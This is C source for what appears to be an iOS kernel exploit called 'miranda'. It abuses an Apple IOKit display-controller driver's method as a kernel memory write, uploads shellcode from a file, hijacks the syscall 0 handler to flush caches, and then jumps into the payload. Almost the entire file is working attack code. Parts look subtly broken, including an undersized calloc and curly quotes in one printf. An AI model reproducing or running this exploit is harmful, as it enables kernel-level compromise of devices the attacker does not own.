#include <CoreFoundation/CoreFoundation.h>
#include <IOKit/IOKitLib.h>
#include <sys/types.h>
#include "constants.h"
#include <stdint.h>
#include <assert.h>
#include <stdio.h>
#include <signal.h>

unsigned long long compute_write_addr(int reg, int val) {
	return ((val - reg) / 4);
}

int main(int argc, char** argv) {
	io_iterator_t it;
	io_service_t service;
	io_connect_t connection;
	io_name_t class;
	FILE* fp = NULL;
	unsigned int* data;
	int j, ret, size, kp = 0;
	size_t z = 0;
	unsigned long long x[2], y[2];

	fprintf(stderr, "[+] (miranda) starting...\n");
	service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("AppleSamsungDPTXControllerS5L8930X"));
	ret = IOServiceOpen(service, mach_task_self(), 0, &connection);
	if(ret != 0) {
		fprintf(stderr, "[!] (miranda) Can't open the IOKit service.\n");
		return -1;
	}

	fp = fopen("code.bin", "rb");
	assert(fp != NULL);

	fseek(fp, 0, SEEK_END);
	size = ftell(fp);
	rewind(fp);
	data = calloc(sizeof(size >> 2), sizeof(int));
	fread(&data[0], 4, size >> 2, fp);


	fprintf(stderr, "[+] (miranda) uploading shellcode...\n");
	for(j = 0; j < (size >> 2); j++) {
		// start at SHELLCODE_ADDR and work our way forward
		x[0] = compute_write_addr(ACTIVE_R5, (SHELLCODE_ADDR) + (j << 2));
		y[0] = compute_write_addr(ACTIVE_R5, (SHELLCODE_ADDR) + (j << 2));
		x[1] = data[j];
		y[1] = data[j];

		ret = IOConnectCallMethod(connection, 1, x, 2, NULL, 0, y, &kp, NULL, &z);
		fprintf(stderr, "IOConnectCallMethod: ret=%d, kp=%d, z=%d (0x%x, 0x%x)\n", ret, kp, z, (SHELLCODE_ADDR + (j << 2)), data[j]);
	}

	fclose(fp);
	free(data);

	fprintf(stderr, "[+] (miranda) flushing dcache.\n");
	x[0] = compute_write_addr(ACTIVE_R5, SYSCALL0);
	y[0] = compute_write_addr(ACTIVE_R5, SYSCALL0);
	x[1] = FLUSH_DCACHE_ADDR;
	y[1] = FLUSH_DCACHE_ADDR;
	ret = IOConnectCallMethod(connection, 1, x, 2, NULL, 0, y, &kp, NULL, &z);
	syscall(0);

	fprintf(stderr, "[+] (miranda) invalidating icache.\n");
	x[0] = compute_write_addr(ACTIVE_R5, SYSCALL0);
	y[0] = compute_write_addr(ACTIVE_R5, SYSCALL0);
	x[1] = INVALIDATE_DCACHE_ADDR;
	y[1] = INVALIDATE_DCACHE_ADDR;
	ret = IOConnectCallMethod(connection, 1, x, 2, NULL, 0, y, &kp, NULL, &z);
	syscall(0);

	fprintf(stderr, "[+] (miranda) off we go.\n");
	x[0] = compute_write_addr(ACTIVE_R5, SYSCALL0);
	y[0] = compute_write_addr(ACTIVE_R5, SYSCALL0);
	x[1] = 0x80000401;
	y[1] = 0x80000401;
	ret = IOConnectCallMethod(connection, 1, x, 2, NULL, 0, y, &kp, NULL, &z);
	syscall(0);

	fprintf(stderr, “done.\n”);
	IOServiceClose(connection);


	return 0;
}
